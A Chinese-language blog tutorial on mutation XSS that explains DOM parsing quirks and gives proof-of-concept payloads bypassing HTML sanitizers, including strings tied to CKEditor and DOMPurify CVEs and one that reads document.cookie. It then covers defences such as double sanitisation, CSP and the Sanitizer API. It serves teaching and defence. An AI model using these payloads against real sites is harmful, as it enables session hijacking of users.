---
title: mXSS突变型跨站脚本
date: 2025-05-01 08:00:00
tags:
  - Web安全
  - 渗透测试
description: mXSS 突变型跨站脚本——DOM 解析器差异与富文本编辑器 mXSS 案例。
categories: 渗透测试
---

## 0x00 引言

跨站脚本（XSS）长期霸占 OWASP Top 10。在存储型、反射型、DOM型之外，有一种更隐蔽的变种——**突变型跨站脚本（Mutation XSS，mXSS）**。

mXSS 的核心不在于直接注入恶意代码，而在于利用浏览器解析和序列化 HTML 时的"突变"：**一串看似无害的 HTML，经 DOM 解析后再序列化，变成了可执行的恶意脚本**。它能绕过几乎所有基于字符串级别的 XSS 过滤器和消毒器。

```
攻击流程概览:
  [无害HTML字符串] → [HTML消毒器: 判定安全,放行] → [innerHTML赋值]
                                                         │
                                                    DOM解析突变
                                                         ▼
                                               [突变后DOM → XSS触发]
```

## 0x01 mXSS 原理剖析

### 1.1 根本原因

浏览器解析 HTML 时执行大量容错（Error Correction）——这是 HTML5 规范的强制要求。当解析后的 DOM 树被重新序列化时，输出的 HTML 可能与输入截然不同。"解析→序列化"往返过程就是 mXSS 的温床：

```
输入字符串 S → [innerHTML写] → DOM树 → [innerHTML读] → 输出字符串 S'
                                    │
                              S' ≠ S，S' 包含可执行代码 → XSS
```

### 1.2 innerHTML vs DOMParser：核心矛盾

`DOMParser` 和 `innerHTML` 使用**不同的解析上下文**，对相同片段可能产出不同 DOM 树。这就是 mXSS 的根本矛盾——消毒器用前者判断安全，浏览器用后者实际渲染。

```javascript
const html = '<table><img src=x onerror=alert(1)></table>';

// 消毒器用 DOMParser 扫描
const doc = new DOMParser().parseFromString(html, 'text/html');
// <img> 在 <table> 内部特殊上下文

// 实际渲染用 innerHTML
const div = document.createElement('div');
div.innerHTML = html;
// 浏览器纠错可能将 <img> 移出 <table>——结构突变！
```

## 0x02 DOM 容错机制与命名空间

### 2.1 Foster Parenting（寄养）

浏览器在 `<table>` 内遇到非法内容时，将其"寄养"到 `<table>` 之前。这是最重要的容错机制之一：

```
输入:  <table><tr><td><svg><style></style></svg></td></tr></table>
输出:  <svg><style></style></svg><table><tbody><tr><td></td></tr></tbody></table>
```

### 2.2 影响 mXSS 的关键元素

| 元素/上下文 | 突变行为 | 利用场景 |
|---|---|---|
| `<table>/<tbody>/<tr>` | foster parenting | 将内容驱逐到表格外 |
| `<svg>/<math>` | 命名空间切换 | 在边界触发解析差异 |
| `<style>` | 原始文本元素 | 配合命名空间"吞掉"payload |
| `<noscript>` | 序列化依赖JS状态 | 解析结果不可预测 |
| `<form>/<select>` | 严格内容模型 | 驱逐非法子节点 |

### 2.3 命名空间混淆

现代浏览器同时支持 HTML、SVG、MathML 三种命名空间。当片段在命名空间间切换时，解析行为剧烈变化——这正是多数经典 mXSS 的构建基础。

## 0x03 经典攻击手法

### 3.1 畸形 table 嵌套

```html
<form><table><math><style>
</style></math></table></form>
```
消毒器视角：`<style>` 在 table 内的文本节点中，无害。
浏览器视角：foster parenting 将内容移到 `<table>` 前，`<math>` 内 `<style>` 的原始文本模式吞掉后续内容，`</style>` 后剩余内容被释放。

### 3.2 SVG 命名空间攻击

```html
<svg><style><!--</style><img src=x onerror=alert(1)>-->
```
SVG 内 `<style>` 遵循 XML 规则，内容不经过 HTML 实体解码。`<!--` 被视为 CSS 注释被 `<style>` 吞掉。`</style>` 闭合后 `<img>` 成为真实元素。

### 3.3 实体编码混淆

```html
<div id="&lt;img src=x onerror=alert(1)&gt;"></div>
```
消毒器在属性值中看到编码实体，判定安全。但 DOM 序列化后再赋值给 innerHTML，实体可能被解码为尖括号。

## 0x04 浏览器差异

| 特性 | Chrome/Edge | Firefox | Safari |
|---|---|---|---|
| `<isindex>` 处理 | 支持 | 支持 | 不支持 |
| foster parenting | 严格 | 略有差异 | 略有差异 |
| `<noscript>` 序列化 | JS启用时 | JS启用时 | 行为不同 |
| SVG内HTML元素 | 严格 | 较宽松 | 中等 |

```html
<!-- Firefox/payload: type="image"使isindex成为提交按钮 -->
<form><isindex action="javascript:alert(1)" type="image">
```

## 0x05 富文本编辑器的 mXSS

富文本编辑器是 mXSS 高发区——核心功能"接收HTML→清洗→渲染"完美契合攻击模型。

### 5.1 CKEditor CVE-2021-33829

```html
<math><style><!--
<img src=x onerror=alert(document.cookie)>
--></style></math>
```

攻击链路：
1. 攻击者粘贴到源码模式 → 消毒器解析：`<math>` 创建 MathML，`<style>` 作为原始文本，内容 `<!-- ... -->` 被视为无害 → 判定安全
2. 切回所见即所得模式时浏览器重新解析 → `<style>` 闭合后 `<img>` "释放" → 脚本执行

### 5.2 TinyMCE 过滤绕过

```javascript
const cleanHtml = tinymce.cleanup(userInput); // 内部使用DOMParser
// ...存入数据库...AJAX返回...
document.getElementById('content').innerHTML = cleanHtml;
//                   ^^^^^^^^ 解析结果与DOMParser不同 → mXSS
```

### 5.3 编辑器通用绕过模型

```
用户输入 → 客户端消毒(DOMParser) → 服务端消毒 → 存储 → 读取
                                                      │
XSS! ←──── innerHTML渲染 ←──── AJAX返回 ←─────────────┘
              ▲ 突变发生
```

## 0x06 消毒器绕过

### 6.1 DOMPurify CVE-2020-26870

```html
<svg><style><img/src=x onerror=alert(1)></style></svg>
```

DOMPurify 用 DOMParser 构建临时 DOM → SVG 命名空间中 `<style>` 内容被视为文本 → 消毒器遗漏 → 序列化后再被 innerHTML 解析时突变。

### 6.2 命名空间穿越 payload

```html
<math><mtext><table><mglyph><style><!--
</style><img src=x onerror=alert(1)>
-->
```

解析路径：`<math>`(MathML) → `<mtext>` → `<table>`(非法) → `<mglyph>` → `<style>`(原始文本,吞后续) → `</style>`(退出) → `<img>`(回到HTML,成为真实元素)

## 0x07 真实攻击面

- **邮件客户端**：攻击者发送含特殊 HTML 的邮件 → 服务端消毒 → 受害者打开 Web 界面 → innerHTML 渲染突变 → 会话劫持
- **社交平台**：个人资料富文本、文章编辑器、评论系统、私信 — 多个主流平台因此支付赏金
- **企业协作工具**：Confluence、Notion、Slack — 复杂嵌套 DOM + 自定义消毒器 + 多次序列化往返 = 高风险

## 0x08 防御策略

### 8.1 mXSS 感知消毒流程

```
原始HTML → DOMParser解析 → 白名单过滤 → 序列化
    │                                       │
    └───── 再次解析为DOM ←──────────────────┘
                    │
          比较两次DOM是否一致
          ├─ 一致 → 安全渲染
          └─ 不一致 → 拒绝(mXSS检测)
```

### 8.2 双重消毒实现

```javascript
function safeSetInnerHTML(element, dirtyHtml) {
    const clean1 = DOMPurify.sanitize(dirtyHtml, {
        FORBID_TAGS: ['svg', 'math', 'style'],
        FORBID_ATTR: ['onerror', 'onload', 'onclick']
    });
    const clean2 = DOMPurify.sanitize(clean1);
    if (clean1 !== clean2) {
        element.textContent = '[内容被安全策略拒绝]';
        return console.warn('mXSS detected');
    }
    element.innerHTML = clean2;
}
```

### 8.3 服务端 + CSP + Sanitizer API

```javascript
// 服务端 (jsdom + DOMPurify)
const { JSDOM } = require('jsdom');
const createDOMPurify = require('dompurify');
function serverSanitize(dirty) {
    const DOMPurify = createDOMPurify(new JSDOM('').window);
    const clean = DOMPurify.sanitize(dirty, {
        ALLOWED_TAGS: ['b','i','em','a','p','br','ul','ol','li',
                       'blockquote','code','pre','span'],
        FORBID_TAGS: ['svg','math','style'],
        FORBID_ATTR: ['onerror','onload','onclick']
    });
    if (clean !== DOMPurify.sanitize(clean)) throw new Error('mXSS');
    return clean;
}
```

```html
<!-- CSP纵深防御 -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self' 'nonce-{random}';
               object-src 'none'; base-uri 'self';">
```

```javascript
// Sanitizer API（未来方向，内部处理mXSS）
if (window.Sanitizer) {
    element.setHTML(dirtyHtml, {
        sanitizer: new Sanitizer({
            dropElements: ['script','style','svg','math']
        })
    });
    // setHTML() 使用与渲染时相同的解析器
}
```

## 0x09 防御体系总览

```
用户输入 → 客户端消毒(DOMPurify+双重验证) → 服务端消毒(独立库+二次验证)
                                                      │
                                              数据库存储 → 读取
                                                      │
MutationObserver ← CSP策略 ←── innerHTML渲染 ←────────┘
(运行时监控)     (script-src)    (突变可能发生)
```

## 0x0A 常见误区

| 误区 | 为什么错误 | 正确做法 |
|---|---|---|
| "正则过滤就够了" | HTML过于复杂，正则无法覆盖边界 | 使用 DOMPurify 等专业消毒器 |
| "DOMParser消毒万无一失" | 与 innerHTML 解析结果可能不同 | 双重验证+结构对比 |
| "CSP完全阻止XSS" | 纵深防御，不能替代消毒 | 多层防御，CSP兜底 |
| "只消毒一次够了" | 下游再次解析时才是真正攻击面 | 每次往返后验证 |
| "禁止SVG/MathML就安全" | 利用的是命名空间切换行为 | 理解原理，从根本上防护 |

> **核心教训**：你不是在防御"字符串"，而是在防御"字符串经浏览器解析后形成的 DOM 树"。不涉及真实 DOM 解析的安全判断，都可能在 mXSS 面前失效。

## 0x0B 结语

mXSS 提醒我们：浏览器是一台极其复杂的 HTML 编译器，其纠错容错机制创造了超出预期的攻击面。防御 mXSS 需要开发阶段的双重消毒验证、测试阶段的跨浏览器 DOM 结构检测、运维阶段的严格 CSP 与运行时监控。安全没有银弹，只有持续关注和分层防御。

## 0x0C 免责声明

> **免责声明**：本文所述的 mXSS 攻击技术、代码示例及漏洞分析方法，仅供信息安全领域研究人员、开发者和安全从业者进行合法的安全研究、渗透测试授权评估及防护策略设计之用。
>
> - 任何利用本文内容从事未授权的系统入侵、数据窃取、服务破坏或其他违反《中华人民共和国网络安全法》《中华人民共和国刑法》及相关国际法的行为，均与作者无关。
> - 文中提及的 CVE 编号、厂商名称和产品名称仅用于安全研究目的，不构成对任何厂商或产品的诋毁。
> - 所有代码示例均简化以说明原理，请勿直接用于生产环境。
> - 安全是持续演进的过程——本文写于2025年5月，所述漏洞可能已被修复或有新的绕过方式。请保持对安全社区动态的关注。

---

*本文写于 2025年5月 · 欢迎通过评论区交流 mXSS 绕过与防御经验*
